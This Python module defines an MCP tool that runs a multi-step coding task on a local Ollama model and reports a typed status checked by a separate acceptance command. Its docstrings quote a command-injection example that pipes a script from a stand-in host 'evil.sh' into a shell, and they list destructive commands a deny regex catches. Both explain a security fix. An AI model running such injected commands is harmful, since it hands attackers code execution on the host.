"""A whole task, owned by a local model, verified by something that is not it.

The prompt-time agent loop answers a PROMPT: it runs inside UserPromptSubmit,
before Claude's turn begins, bounded at 90 seconds, and hands back text. That
shape cannot absorb the thing that actually costs money — one Claude prompt
becoming several hundred tool calls, each one a full turn re-reading a large
context.

This tool inverts it. Claude submits an objective once and reads one result.
Every read, edit and command in between happens locally and never enters
Claude's context at all. Ten tool calls become one turn instead of ten.

Three properties are load-bearing, and each exists because of a measured failure:

1.  **A typed terminal status, never a hopeful string.** The loop returns
    "Agent reached maximum iterations. Partial work may have been done." when it
    runs out of turns, and `direct_executor.quality_ok` accepts that — it checks
    length and refusal phrases. In a benchmark on 2026-09-12 that exact string
    was scored as a pass. Here, exhaustion is `incomplete`, and it can never be
    `verified_complete`.

2.  **Acceptance is checked by the supervisor, not the worker.** The model that
    did the work does not get to grade it. The check is a command supplied by
    the caller, run in a subprocess after the loop has finished. The same
    benchmark measured the local model diagnosing a bug correctly in prose and
    never changing the code — self-report would have called that done.

3.  **No cloud fallback, ever.** If Ollama is unreachable or the budget is
    exhausted, this returns a typed failure with whatever was staged. Falling
    back to a paid model would make the cost saving unmeasurable and silently
    reintroduce the thing the tool exists to avoid.

Scope: this is the task-service core — bounded execution and honest reporting.
It is not the sandbox. Commands run with the caller's own privileges under
`agent_writes`' allowlist, so `workdir` must be a directory the caller is
willing to have modified. `docs/PROPOSAL_LOCAL_EXECUTION.md` describes the
confinement work this deliberately does not yet do.
"""
from __future__ import annotations

import hashlib
import json
import os
import shlex
import subprocess
import time
from pathlib import Path

from llm_router import trace as _trace

# Terminal statuses. `verified_complete` is the ONLY one that means the work is
# done, and it requires an acceptance check that actually ran and passed.
VERIFIED_COMPLETE = "verified_complete"   # check supplied, ran, passed
PROPOSED = "proposed"                     # work staged, no check supplied to prove it
INCOMPLETE = "incomplete"                 # budget or iterations exhausted
FAILED_CHECK = "failed_check"             # check supplied, ran, failed
BLOCKED = "blocked"                       # could not start: no model, bad workdir
FAILED = "failed"                         # the loop raised

_EXHAUSTION_MARKERS = (
    "reached maximum iterations",
    "partial work may have been done",
)

_NOISE = {"__pycache__", ".pytest_cache", ".git", ".DS_Store", ".ruff_cache", ".mypy_cache"}

DEFAULT_BUDGET_S = 600.0
DEFAULT_MODEL = "qwen3-coder:30b"


def _snapshot(root: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    for p in root.rglob("*"):
        if not p.is_file() or (_NOISE & set(p.parts)) or p.name in _NOISE:
            continue
        try:
            out[str(p.relative_to(root))] = hashlib.sha256(p.read_bytes()).hexdigest()
        except OSError:
            continue
    return out


def _changed(before: dict[str, str], after: dict[str, str]) -> list[str]:
    return sorted(k for k in set(before) | set(after) if before.get(k) != after.get(k))


def _run_check(check: str | list[str], cwd: Path, timeout: float) -> tuple[bool, str]:
    """Run the caller's acceptance check. Its exit code is the verdict.

    Deliberately a subprocess and not something the worker can influence: the
    whole point is that the model which did the work does not grade it.

    NO SHELL. This ran `subprocess.run(check, shell=True, ...)` until 2026-09-14,
    which made one string on an MCP tool call a general command-injection
    primitive — `pytest -q; curl evil.sh | sh` is two commands, and nothing
    sanitised it. `run_command` inside the agent loop had the right pattern all
    along (agent_loop.py: shlex.split + shell=False); this now matches it.

    A string is still accepted and split with `shlex`, so existing callers keep
    working, but shell METACHARACTERS no longer mean anything: `;`, `|`, `&&`,
    `$(...)` and redirections become literal arguments to one program.
    """
    argv = list(check) if isinstance(check, (list, tuple)) else shlex.split(check or "")
    if not argv:
        return False, "acceptance check was empty"
    try:
        r = subprocess.run(argv, capture_output=True, text=True,
                           cwd=str(cwd), timeout=max(1.0, timeout))
    except subprocess.TimeoutExpired:
        return False, f"acceptance check timed out after {timeout:.0f}s"
    except Exception as exc:                                   # noqa: BLE001
        return False, f"acceptance check could not run: {type(exc).__name__}: {exc}"
    tail = ((r.stdout or "") + (r.stderr or ""))[-2000:]
    return r.returncode == 0, tail


async def llm_local_task(
    objective: str,
    workdir: str,
    acceptance_check: str | None = None,
    model: str = DEFAULT_MODEL,
    budget_s: float = DEFAULT_BUDGET_S,
    apply_writes: bool = False,
) -> str:
    """Run a whole multi-step task on a local model and report a typed result.

    Args:
        objective: What to accomplish. Written for a model that will read the
            repo itself — describe the goal, not the steps.
        workdir: The directory the task operates in. Files here may be modified.
        acceptance_check: A shell command that exits 0 when the objective is
            met (e.g. ``python3 -m pytest tests -q``). Without one the result
            can never be ``verified_complete`` — an unverified success is
            reported as ``proposed``, because nothing established that it works.
        model: Ollama model to drive the loop.
        budget_s: Wall-clock ceiling for the whole task, check included.
        apply_writes: Whether edits reach disk. Defaults to False since
            2026-09-14: True ALSO set LLM_ROUTER_AGENT_COMMANDS=all, and
            agent_writes.guard_command returns True immediately under `all`,
            skipping the entire inspection allowlist. What remained was a regex
            catching `rm -rf /`, `mkfs`, `dd` and `curl|sh` — not `cp`, `mv`,
            `tee` or `git`. Writes themselves are confined to project_root by
            agent_loop._resolve_path; run_command arguments are not. A tool whose
            default grants that much authority is one granted by accident.
            False leaves the loop in its
            default ``propose`` mode, where it computes diffs and changes
            nothing.

    Returns:
        A JSON object with ``status`` (one of the module's terminal statuses),
        ``changed_files``, ``check_passed``, ``check_output``, ``elapsed_s``
        and the model's own final ``report``. The report is the worker's
        account of what it did and is never evidence on its own.
    """
    started = time.monotonic()
    root = Path(workdir).expanduser()
    if not root.is_dir():
        return json.dumps({
            "status": BLOCKED,
            "reason": f"workdir is not a directory: {workdir}",
            "changed_files": [], "check_passed": None, "elapsed_s": 0.0,
        })

    try:
        from llm_router.hooks.agent_loop import run_agent_loop
    except ImportError as exc:                                 # noqa: BLE001
        return json.dumps({
            "status": BLOCKED,
            "reason": f"local agent loop unavailable: {exc}",
            "changed_files": [], "check_passed": None, "elapsed_s": 0.0,
        })

    # Scoped to this call. The `propose` default is right for a hook that fires
    # on every prompt; a caller who submitted a task and named a workdir has
    # asked for the work to happen.
    prev_writes = os.environ.get("LLM_ROUTER_AGENT_WRITES")
    prev_cmds = os.environ.get("LLM_ROUTER_AGENT_COMMANDS")
    if apply_writes:
        os.environ["LLM_ROUTER_AGENT_WRITES"] = "apply"
        # Applying WRITES must not also unlock arbitrary COMMANDS. These were
        # raised together, so asking for an edit on disk silently bought the
        # whole allowlist as well. Set LLM_ROUTER_AGENT_COMMANDS deliberately if
        # that is really wanted.

    try:
        from llm_router.context_injection import inject
        objective = inject(objective, root=str(root))
    except Exception:                                        # noqa: BLE001
        pass

    before = _snapshot(root)
    _trace.emit("task.start", objective=objective, workdir=str(root),
                model=model, budget_s=budget_s, apply_writes=apply_writes,
                acceptance_check=acceptance_check, files_before=len(before))
    report, error = None, None
    try:
        report = run_agent_loop(
            prompt=objective,
            model=model,
            project_root=root,
            timeout_per_call=90,
            deadline_s=budget_s,
        )
    except Exception as exc:                                   # noqa: BLE001
        error = f"{type(exc).__name__}: {exc}"
    finally:
        for key, prev in (("LLM_ROUTER_AGENT_WRITES", prev_writes),
                          ("LLM_ROUTER_AGENT_COMMANDS", prev_cmds)):
            if prev is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = prev

    after = _snapshot(root)
    changed = _changed(before, after)
    elapsed = time.monotonic() - started

    if error is not None:
        status, check_passed, check_out = FAILED, None, ""
    else:
        text = (report or "").lower()
        exhausted = any(m in text for m in _EXHAUSTION_MARKERS)
        remaining = budget_s - elapsed
        if acceptance_check and remaining > 0:
            ok, check_out = _run_check(acceptance_check, root, remaining)
            check_passed = ok
            # Exhaustion loses to a passing check: if the objective is
            # demonstrably met, how many turns it took is not interesting.
            status = VERIFIED_COMPLETE if ok else (INCOMPLETE if exhausted else FAILED_CHECK)
        elif acceptance_check:
            status, check_passed, check_out = INCOMPLETE, None, "no budget left to run the check"
        else:
            # No check means nothing proved this works. Never claim it did.
            status, check_passed, check_out = (INCOMPLETE if exhausted else PROPOSED), None, ""

    _trace.emit("task.end", status=status, changed_files=changed,
                check_passed=check_passed, elapsed_s=round(elapsed, 1),
                error=error, report=report)
    return json.dumps({
        "status": status,
        "model": f"ollama/{model}",
        "changed_files": changed,
        "check_passed": check_passed,
        "check_output": check_out[-1500:] if check_out else "",
        "elapsed_s": round(elapsed, 1),
        "budget_s": budget_s,
        "writes_applied": bool(apply_writes),
        "error": error,
        "report": (report or "")[:1500],
        "note": (
            "`report` is the worker's own account and is not evidence. "
            "Only `status == 'verified_complete'` means an independent check ran and passed."
        ),
    }, indent=2)


def register(mcp, should_register=None) -> None:
    """Register llm_local_task, honouring the slim-surface gate."""
    if should_register is None or should_register("llm_local_task"):
        mcp.tool()(llm_local_task)
